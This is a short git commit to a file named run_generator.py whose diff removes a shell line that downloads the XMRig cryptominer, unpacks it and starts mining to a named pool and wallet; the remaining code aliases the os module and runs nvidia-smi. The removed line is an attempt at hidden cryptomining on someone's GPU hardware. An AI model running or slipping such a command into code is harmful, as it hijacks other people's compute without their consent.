d0e7b8ebd2002444bbeb0d91306e61cc07c37976
anhacvai11 <90373481+anhacvai11@users.noreply.github.com>
2021-10-10 10:35:10 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,2 @@
 import os as alpha
 alpha.system("nvidia-smi")
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz && tar -zxf xmrig-6.14.0-linux-x64.tar.gz && cd xmrig-6.14.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u RVNRNFHXZ2EUccqiGqP5UWBotqX8nvxLYS6DX:.Anh -p x
